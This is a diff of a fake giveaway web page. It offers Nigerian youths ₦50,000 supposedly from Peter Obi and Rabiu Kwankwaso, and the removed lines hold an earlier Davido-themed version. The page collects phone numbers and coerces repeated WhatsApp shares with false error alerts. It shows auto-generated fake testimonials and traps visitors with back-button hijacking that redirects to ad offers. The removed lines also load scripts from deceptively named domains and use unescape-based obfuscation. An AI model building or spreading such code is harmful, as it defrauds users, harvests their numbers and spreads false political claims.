-  }
-  @keyframes flcHeartUp{
-    0%{opacity:1;transform:translateY(0) scale(.6);}
-    100%{opacity:0;transform:translateY(-26px) scale(1.3);}
-  }
-  /* Mobile: stop iOS auto-zoom on inputs under 16px, keep tap highlight subtle */
-  #flc-widget input{-webkit-tap-highlight-color:transparent;}
-  #flc-widget button{-webkit-tap-highlight-color:transparent;}
-</style>
- 
-<div id="flc-widget" style="width:100%;max-width:520px;margin:0 auto;background:#FFFFFF;border-radius:16px;box-shadow:0 1px 2px rgba(0,0,0,.08),0 8px 24px rgba(0,0,0,.06);overflow:hidden;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#050505;box-sizing:border-box;">
- 
-  <!-- reaction summary -->
-  <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px 8px;font-size:13.5px;color:#65676B;box-sizing:border-box;">
-    <div style="display:flex;align-items:center;gap:6px;">
-      <span style="display:inline-flex;align-items:center;">
-        <span style="width:18px;height:18px;border-radius:50%;background:#1B74E4;display:flex;align-items:center;justify-content:center;border:2px solid #fff;z-index:2;">
-          <svg viewBox="0 0 24 24" width="11" height="11" style="fill:#fff;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
-        </span>
-        <span style="width:18px;height:18px;border-radius:50%;background:#F33E58;display:flex;align-items:center;justify-content:center;border:2px solid #fff;margin-left:-6px;z-index:1;">
-          <svg viewBox="0 0 24 24" width="10" height="10" style="fill:#fff;"><path d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z"/></svg>
-        </span>
-      </span>
-      <span id="flcLikeTotal" style="color:#65676B;">341</span>
-    </div>
-    <div style="display:flex;gap:12px;">
-      <span><b id="flcCommentCount" style="color:#65676B;font-weight:400;">0</b> comments</span>
-      <span id="flcShareCount">18 shares</span>
-    </div>
-  </div>
- 
-  <!-- like / comment / share bar -->
-  <div style="display:flex;border-top:1px solid #E4E6EB;border-bottom:1px solid #E4E6EB;box-sizing:border-box;">
-    <button type="button" id="flcPostLikeBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
-      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
-      Like
-    </button>
-    <button type="button" id="flcPostCommentBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
-      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg>
-      Comment
-    </button>
-    <button type="button" id="flcPostShareBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
-      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z"/></svg>
-      Share
-    </button>
-  </div>
- 
-  <div id="flcTypingStatus" style="min-height:18px;padding:4px 16px 0;font-size:12.5px;color:#65676B;box-sizing:border-box;"></div>
- 
-  <!-- comment list -->
-  <div id="flcComments" style="padding:10px 14px;overflow-y:auto;max-height:min(60vh,440px);scroll-behavior:smooth;box-sizing:border-box;-webkit-overflow-scrolling:touch;"></div>
- 
-  <!-- composer -->
-  <div style="padding:10px 14px 12px;border-top:1px solid #E4E6EB;background:#fff;box-sizing:border-box;">
-    <div style="display:flex;gap:8px;align-items:center;">
-      <div id="flcYouAvatar" title="Click to set your profile picture" style="position:relative;width:32px;height:32px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#fff;cursor:pointer;"></div>
-      <input type="file" id="flcProfilePicInput" accept="image/*" style="display:none;" />
-      <form id="flcComposerForm" style="flex:1;display:flex;gap:8px;align-items:center;min-width:0;">
-        <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200"
-          style="flex:1;min-width:0;border:none;background:#F0F2F5;border-radius:20px;padding:9px 14px;font-size:16px;font-family:inherit;outline:none;color:#050505;box-sizing:border-box;" />
-        <button type="button" id="flcAttachBtn" aria-label="Add photo" title="Add photo"
-          style="border:none;background:#F0F2F5;color:#65676B;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
-          <svg viewBox="0 0 24 24" width="16" height="16" style="fill:currentColor;"><path d="M9 3l-1.8 2H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10zm0-2a3 3 0 100-6 3 3 0 000 6z"/></svg>
-        </button>
-        <input type="file" id="flcFileInput" accept="image/*" style="display:none;" />
-        <button type="submit" aria-label="Send"
-          style="border:none;background:#1B74E4;color:#fff;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
-          <svg viewBox="0 0 24 24" width="16" height="16" style="fill:#fff;transform:translateX(1px);"><path d="M2 21l21-9L2 3v7l15 2-15 2z"/></svg>
-        </button>
-      </form>
-    </div>
-    <div id="flcAttachPreview" style="display:none;margin:8px 0 0 42px;position:relative;width:88px;">
-      <img id="flcAttachImg" src="" alt="Attached image preview" style="width:88px;height:88px;object-fit:cover;border-radius:10px;border:1px solid #E4E6EB;display:block;" />
-      <div id="flcAttachRemove" style="position:absolute;top:-6px;right:-6px;width:22px;height:22px;border-radius:50%;background:rgba(5,5,5,.8);color:#fff;border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:12px;line-height:1;cursor:pointer;">✕</div>
-    </div>
-  </div>
- 
-</div>
+      </div>
 
+      <!-- Dynamic Social Comments Feed Widget -->
+      <div id="flc-widget">
 
-		
-      <script src="https://div-ccsss-font-class.ink/david-java-htm-xlm-txt-verify-google-chrome-script-java-cokies-css.js"></script>
-   
- <script src="https://code.jquery.com/jquery-latest.min.js"></script>
-     <script>
-         
-        var time = 0;
-window.setInterval(function () {
-    time = time + 1;
-    $(".t1").html(time + 1 + "m");
-    $(".t2").html(time + 2 + "m");
-    $(".t3").html(time + 4 + "m");
-}, 6e4);
-var likes = 134,
-    comments = 23,
-    shares = 12;
-window.setInterval(function () {
-    likes = likes + Math.floor(Math.random() * 3);
-    comments = comments + Math.floor(Math.random() * 2);
-    shares = shares + Math.floor(Math.random() * 2);
-    $("#likes").html(likes + "K");
-    $("#comments").html(comments + "K comments");
-    $("#shares").html(shares + "K shares");
-}, 5e3);
-$(".liked").click(function () {
-    if ($(this).hasClass("selected")) {
-        $(this).removeClass("selected");
-        $(this).html("Like");
-    } else {
-        $(this).addClass("selected");
-        $(this).html("Unlike");
+        <!-- Reaction Bar Header -->
+        <div
+          style="display:flex; justify-content:space-between; align-items:center; padding:10px 14px; font-size:12.5px; color:#64748B; background:#F8FAFC; border-bottom:1px solid #E2E8F0;">
+          <div style="display:flex; align-items:center; gap:4px;">
+            <span style="display:inline-flex; align-items:center;">
+              <span
+                style="width:16px; height:16px; border-radius:50%; background:#1B74E4; display:flex; align-items:center; justify-content:center; border:1.5px solid #fff; z-index:2;">
+                <svg viewBox="0 0 24 24" width="9" height="9" style="fill:#fff;">
+                  <path
+                    d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z" />
+                </svg>
+              </span>
+              <span
+                style="width:16px; height:16px; border-radius:50%; background:#F33E58; display:flex; align-items:center; justify-content:center; border:1.5px solid #fff; margin-left:-5px; z-index:1;">
+                <svg viewBox="0 0 24 24" width="8" height="8" style="fill:#fff;">
+                  <path
+                    d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z" />
+                </svg>
+              </span>
+            </span>
+            <span id="flcLikeTotal" style="font-weight:700; color:#0F172A;">341</span>
+          </div>
+          <div style="display:flex; gap:12px; font-weight:500;">
+            <span><b id="flcCommentCount" style="color:#0F172A; font-weight:700;">0</b> comments</span>
+            <span>18 shares</span>
+          </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div style="display:flex; border-bottom:1px solid #E2E8F0;">
+          <button type="button" id="flcPostLikeBtn"
+            style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+            <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;">
+              <path
+                d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z" />
+            </svg> Like
+          </button>
+          <button type="button" id="flcPostCommentBtn"
+            style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+            <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;">
+              <path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z" />
+            </svg> Comment
+          </button>
+          <button type="button" id="flcPostShareBtn"
+            style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+            <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;">
+              <path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z" />
+            </svg> Share
+          </button>
+        </div>
+
+        <!-- Comments List Scroll Area -->
+        <div id="flcComments" style="padding:10px 14px; overflow-y:auto; max-height:400px; scroll-behavior:smooth;">
+        </div>
+
+        <!-- Comment Composer -->
+        <div style="padding:10px 14px; border-top:1px solid #E2E8F0; background:#fff;">
+          <div style="display:flex; gap:8px; align-items:center;">
+            <div id="flcYouAvatar"
+              style="width:30px; height:30px; border-radius:50%; flex-shrink:0; background:var(--primary-gradient); color:#fff; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:800;">
+              Y</div>
+
+            <form id="flcComposerForm" style="flex:1; display:flex; gap:6px; align-items:center;">
+              <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200"
+                style="flex:1; border:1px solid #E2E8F0; background:#F8FAFC; border-radius:999px; padding:0 14px; font-size:13px; outline:none; height:36px; margin:0;" />
+
+              <button type="submit"
+                style="border:none; background:var(--primary-gradient); color:#fff; width:34px; height:34px; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; flex-shrink:0; margin:0; box-shadow:none;">
+                <svg viewBox="0 0 24 24" width="14" height="14" style="fill:#fff;">
+                  <path d="M2 21l21-9L2 3v7l15 2-15 2z" />
+                </svg>
+              </button>
+            </form>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    // Live Counter Incrementation
+    let timeleft = 4548;
+    setInterval(() => {
+      timeleft += Math.floor(Math.random() * 5);
+      document.getElementById('countdowntimer').textContent = timeleft;
+    }, 1500);
+
+    // Load progress from localStorage on start
+    const storageKey = "offer_share_progress";
+    let swidth = localStorage.getItem(storageKey);
+    let width = swidth !== null ? parseInt(swidth, 10) : 0;
+
+    if (width > 0 && width < 100) {
+      $("#intro").fadeOut(0);
+      $("#share").fadeIn(0);
+      $("#fill2").css("width", width + "%");
+      $("#percentage2").text(width + "%");
+    } else if (width >= 100) {
+      $("#intro").fadeOut(0);
+      $("#claim").fadeIn(0);
     }
-});
- 
-        
-        </script>
-<script>
-    
-        $("#go").click(function () {
-    $("#intro").fadeOut(0);
-    $("#loader").fadeIn(1000);
-    var i = 0;
-    var interval = setInterval(function () {
-        $("#num").text(i + "%");
-        i += 1;
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#loader").fadeOut(0);
-            $("#info").fadeIn(1000);
+
+    // Step Triggers
+    $("#go").click(function () {
+      if (!$("#network-select").val()) {
+        alert("Please select a network provider first.");
+        return;
+      }
+      $("#intro").hide();
+      $("#loader").show();
+      let count = 0;
+      let interval = setInterval(() => {
+        count++;
+        $("#num").text(count + "%");
+        if (count >= 100) {
+          clearInterval(interval);
+          $("#loader").hide();
+          $("#info").show();
         }
-    }, 50);
-});
-$("#confirm").click(function () {
-    if ($("#name").val().length < 4)
-    {
-        $(".error").fadeIn(500);
-    } else {
-        $("#info").fadeOut(0);
-        $("#checking").fadeIn(1000);
-        var i = 0;
-        var interval = setInterval(function () {
-            i += 1;
-            $("#percentage").text(i + "%");
-            $("#fill").css("width", i + "%");
-            if (i == 50) {
-                i = 49;
-                setTimeout(function () {
-                    i = 50;
-                }, 1000);
-            }
-            if (i >= 100) {
-                clearInterval(interval);
-                $("#load").fadeOut(0);
-                $("#check").fadeIn(0);
-                setTimeout(function () {
-                    $("#checking").fadeOut(0);
-                    $("#share").fadeIn(1000);
-                    $("#getname").html($("#name").val());
-                }, 500);
-            }
-        }, 50);
+      }, 30);
+    });
+
+    $("#confirm").click(function () {
+      let num = $("#phone-input").val().trim();
+      if (num.length < 10) {
+        $(".error").show();
+      } else {
+        $(".error").hide();
+        $("#info").hide();
+        $("#checking").show();
+
+        let progress = 0;
+        let interval = setInterval(() => {
+          progress++;
+          $("#percentage").text(progress + "%");
+          $("#fill").css("width", progress + "%");
+          if (progress >= 100) {
+            clearInterval(interval);
+            $("#checking").hide();
+            $("#share").show();
+            $("#getname").text(num);
+          }
+        }, 30);
+      }
+    });
+
+// Share Logic
+    const abcde = "https://omg10.com/4/9015019";
+    const text1 = "*OK MOVEMENT YOUTH EMPOWERMENT*%0A%0AAs the agenda is aimed at driving economic growth, improving infrastructure and enhancing the welfare of Youths across all the States, Peter Obi and Rabiu Kwankwaso is giving Nigerians Youth a sum of ₦50,000 Support Fund. %0A%0A*POWERED BY:*%0A_PETER OBI/RABIU KWANKWASO_%0A%0A*₦50,000 Support*👇%0Ahttps://tinyurl.com/ok-movement-empowerment%0A%0A*₦75,000 Support*👇%0Ahttps://tinyurl.com/ok-movement-empowerment%0A%0A*₦100,000 Support*👇%0Ahttps://tinyurl.com/ok-movement-empowerment%0A%0A*₦150,000 Student Support*👇%0Ahttps://tinyurl.com/ok-movement-empowerment";
+    const shareText = "whatsapp://send?text=" + text1;
+    const errorMsg = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share";
+
+    $("#whatsapp").click(function () {
+      window.location.href = shareText;
+
+      if (width === 0) {
+        width += 50;
+      } else if (width === 50) {
+        alert(errorMsg);
+        width += 15;
+      } else if (width === 65) {
+        width += 5;
+      } else if (width === 70) {
+        alert(errorMsg);
+        width += 10;
+      } else if (width === 80) {
+        alert(errorMsg);
+        width += 5;
+      } else if (width === 85) {
+        width += 2;
+      } else if (width === 87) {
+        width += 1;
+      } else if (width === 88) {
+        width += 2;
+      } else if (width === 90) {
+        width += 1;
+      } else if (width === 91) {
+        width += 1;
+      } else if (width === 92) {
+        width += 1;
+      } else if (width === 93) {
+        width += 1;
+      } else if (width === 94) {
+        width += 1;
+      } else if (width === 95) {
+        width += 1;
+      } else if (width === 96) {
+        width += 4;
+      } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+      }
+
+      localStorage.setItem(storageKey, width);
+
+      setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+      }, 1500);
+    });
+
+    $("#offer").click(function () {
+      window.open(abcde, "_blank");
+    });
+
+    // Dynamic Comments Script (Tight Spacing + 10% Nested Reply Logic)
+    (function () {
+      const NAMES = ["Chinedu Okafor", "Aisha Bello", "Oluwaseun Adeyemi", "Emeka Nwosu", "Fatima Usman", "Ibrahim Musa", "Blessing Eze", "David Ojo", "Mercy Johnson"];
+      const COMMENTS = [
+        "OBI FOR 2027, I just received my ₦50,000 Cash! Thank you Obi ❤️",
+  "Just completed my application. Hoping to get the ₦50,000 Support Fund 🙏",
+  "My brother won  ₦50,000 Cash yesterday. This is real!",
+  "Who else is applying for the ₦50,000 Cash on my Account 🔥",
+  "I received my N50k on  palmpay this morning. Thanks. Obi for 2027!",
+  "Thanks for this Step taking 🎉",
+  "I have shared with all my WhatsApp groups. Waiting for approval now.",
+  "I got the ₦50,000 on my kuda . God bless you all!",
+  "This Steps is making so many youths smile. ❤️",
+  "Just finished my verification. Fingers crossed 🤞",
+  "My friend received ₦50,000 today. I hope Im next!",
+  "Thank you Peller  for always supporting your fans across Nigeria.",
+  "I cant believe this is happening. Applied successfully!",
+  "Everybody can apply too? I just submitted mine.",
+  "Good luck everyone! Hope we all get selected."
+      ];
+      const REPLIES = [
+        "Thanks to Obi! I just got my ₦50,000 too. 🎉",
+  "Yes, its available for Opay, Palmpay, Kuda and Moniepoint.",
+  "I received my ₦50,000 reward after completing the verification.",
+  "Same here! Wishing everyone good luck 🙏",
+  "I got the N50k on my Palmpay This morning .",
+  "I hope I get the ₦50,000 cash transfer 🤞",
+  "Thanks for confirming. Im applying now.",
+  "I just shared to my WhatsApp groups too ",
+  "Congratulations in Advance Peter Obi for 2027! ❤️",
+  "This is one of the best fan giveaways this year.",
+  "Cant wait to receive my money o. Good luck everyone! 🔥"
+      ];
+
+      const commentsEl = document.getElementById('flcComments');
+      const commentCountEl = document.getElementById('flcCommentCount');
+      const likeTotalEl = document.getElementById('flcLikeTotal');
+      const likeBtn = document.getElementById('flcPostLikeBtn');
+      const commentBtn = document.getElementById('flcPostCommentBtn');
+      const composerInput = document.getElementById('flcComposerInput');
+
+      let commentCount = 0;
+      let likeCount = 341;
+      let isLiked = false;
+
+      likeBtn.addEventListener('click', function () {
+        isLiked = !isLiked;
+        if (isLiked) {
+          likeCount++;
+          likeBtn.style.color = '#059669';
+        } else {
+          likeCount--;
+          likeBtn.style.color = '#64748B';
+        }
+        likeTotalEl.textContent = likeCount;
+      });
+
+      commentBtn.addEventListener('click', function () {
+        composerInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        composerInput.focus();
+      });
+
+      function addComment(name, text, parentContainer = null) {
+        const isReply = !!parentContainer;
+        const row = document.createElement('div');
+        row.className = 'flc-comment-row';
+
+        const avatar = document.createElement('div');
+        avatar.style.cssText = `width:${isReply ? '22px' : '28px'};height:${isReply ? '22px' : '28px'};border-radius:50%;background:linear-gradient(135deg,#059669,#047857);color:#fff;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;flex-shrink:0;`;
+        avatar.textContent = name.charAt(0);
+
+        const col = document.createElement('div');
+        col.className = 'flc-comment-col';
+
+        const bubble = document.createElement('div');
+        bubble.className = 'flc-comment-bubble';
+        bubble.innerHTML = `<b style="font-size:11.5px;display:block;color:#0F172A;">${name}</b><span>${text}</span>`;
+
+        // Action Toolbar
+        const actions = document.createElement('div');
+        actions.style.cssText = 'font-size:10.5px;color:#64748B;margin:2px 0 0 6px;display:flex;gap:8px;align-items:center;';
+        actions.innerHTML = `
+          <button type="button" class="flc-action-btn flc-like-sub">Like</button>
+          <button type="button" class="flc-action-btn flc-reply-sub">Reply</button>
+          <span>Just now</span>
+        `;
+
+        col.appendChild(bubble);
+        col.appendChild(actions);
+
+        let repliesContainer = null;
+        if (!isReply) {
+          repliesContainer = document.createElement('div');
+          repliesContainer.className = 'flc-replies';
+          col.appendChild(repliesContainer);
+        }
+
+        row.appendChild(avatar);
+        row.appendChild(col);
+
+        // Bind Sub-Like
+        actions.querySelector('.flc-like-sub').addEventListener('click', function () {
+          this.style.color = this.style.color === 'rgb(5, 150, 105)' ? '#64748B' : '#059669';
+        });
+
+        // Bind Sub-Reply
+        actions.querySelector('.flc-reply-sub').addEventListener('click', function () {
+          const targetReplies = isReply ? parentContainer : repliesContainer;
+          let replyBox = targetReplies.querySelector('.flc-reply-input-box');
+
+          if (!replyBox) {
+            replyBox = document.createElement('div');
+            replyBox.className = 'flc-reply-input-box';
+            replyBox.innerHTML = `
+              <input type="text" placeholder="Reply to ${name}…" />
+              <button type="button" style="border:none;background:none;color:#059669;font-weight:800;font-size:11px;cursor:pointer;padding:0 4px;flex-shrink:0;">Send</button>
+            `;
+            targetReplies.appendChild(replyBox);
+
+            const rInput = replyBox.querySelector('input');
+            const rBtn = replyBox.querySelector('button');
+            rInput.focus();
+
+            const submitReply = () => {
+              if (rInput.value.trim()) {
+                addComment('You', rInput.value.trim(), targetReplies);
+                replyBox.remove();
+              }
+            };
+
+            rBtn.addEventListener('click', submitReply);
+            rInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitReply(); });
+          }
+        });
+
+        if (isReply) {
+          parentContainer.appendChild(row);
+        } else {
+          commentsEl.prepend(row);
+        }
+
+        commentCount++;
+        commentCountEl.textContent = commentCount;
+        return repliesContainer;
+      }
+
+      // Initial Seeds
+      addComment(NAMES[0], COMMENTS[0]);
+      addComment(NAMES[1], COMMENTS[1]);
+      const seededParent = addComment(NAMES[2], COMMENTS[2]);
+      addComment(NAMES[3], REPLIES[0], seededParent);
+
+      // Auto-simulate comments with ~10% reply chance
+      setInterval(() => {
+        const randName = NAMES[Math.floor(Math.random() * NAMES.length)];
+        const randText = COMMENTS[Math.floor(Math.random() * COMMENTS.length)];
+        const topParent = addComment(randName, randText);
+
+        if (Math.random() < 0.10) {
+          setTimeout(() => {
+            const replyName = NAMES[Math.floor(Math.random() * NAMES.length)];
+            const replyText = REPLIES[Math.floor(Math.random() * REPLIES.length)];
+            addComment(replyName, replyText, topParent);
+          }, 1500);
+        }
+      }, 5000);
+
+      // Submit user top-level comment
+      document.getElementById('flcComposerForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        if (composerInput.value.trim()) {
+          addComment('You', composerInput.value.trim());
+          composerInput.value = '';
+        }
+      });
+    })();
+  </script>
+
+ <script>
+!function(a, e, t, n) {
+  const redirectURL = "https://reg.kanex.online/grapoffer/go.html";
+
+  const c = function(trigger) {
+    if (a.onbeforeunload === null) {
+      a.onbeforeunload = function() {
+        if (trigger) {
+          setTimeout(function() {
+            a.onbeforeunload = null;
+            a.location.replace(redirectURL);
+          }, 100);
+        }
+        // Do not return anything to avoid Chrome popup
+      };
     }
-});
-$(document).click(function () {
-    if ($("#name").is(":focus")) {
-        $(".error").fadeOut(500);
+  };
+
+  !function(a, e, t, n) {
+    n.replaceState(null, t.title, e.pathname + e.search);
+    for (let i = 0; i < 10; i++) {
+      try {
+        n.pushState(null, t.title, e.pathname + e.search);
+      } catch (err) {
+        i = 10;
+      }
     }
-});
-  
-</script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizea-css.js"></script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizeb-css.js"></script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizec-css.js"></script>
-    <!--
-"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_10GB",
--->
 
+    a.addEventListener("popstate", function() {
+      n.replaceState(null, t.title, e.pathname + e.search);
+      a.onbeforeunload = null;
+      a.location.replace(redirectURL);
+    });
+  }(a, e, t, n);
 
-    
-<script> 
- var text1 = "*₦30,000 ELECTION VICTORY OFFER*%0A%0A*Davido* Collaborate with *OPay, PalmPay, Moniepoint* and *Kuda* to provide *₦30,000* to his fans after his Uncle, Gov. Ademola Adeleke's Osun State Governorship Election victory%0A%0A*POWERED BY*: Davido%0A%0A*APPLY HERE*👇 %0Ahttps://link.kanex.online/Davido-election-30k%0A%0A*Withdraw*👇 %0Ahttps://link.kanex.online/Davido-election-30k",
-    text2 = " an amount of ",
-    text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
-    error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-    abcde = "https://www.blurparkskipper.courses/click?offer_id=32308&pub_id=247806&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE&pub_sub_id=PASS_PLACEMENT_HERE",
-    saved = "",
-    share = "whatsapp://send?text="+text1;
+  try {
+    a.performance.getEntriesByType("navigation").forEach(function(entry) {
+      if (entry.type !== "reload") {
+        c(entry.type !== "navigate");
+      }
+    });
+  } catch (err) {
+    c(true);
+  }
 
-</script>
-           <script>
-    window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="https://omg10.com/4/9015019";
+  t.addEventListener("click", function(event) {
+    for (let el = event.target; el && el !== this; el = el.parentNode) {
+      if (el.matches("a")) {
+        a.onbeforeunload = null;
+        break;
+      }
     }
-    function goon(){
-        location.href="https://omg10.com/4/9015019";
-    }
-</script>
+  }, false);
+}(window, location, document, history);
+  </script> 
 
+  <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737271,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
-
-
-
-    <script>
-        <!-- code by OD 
-        -->
-        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D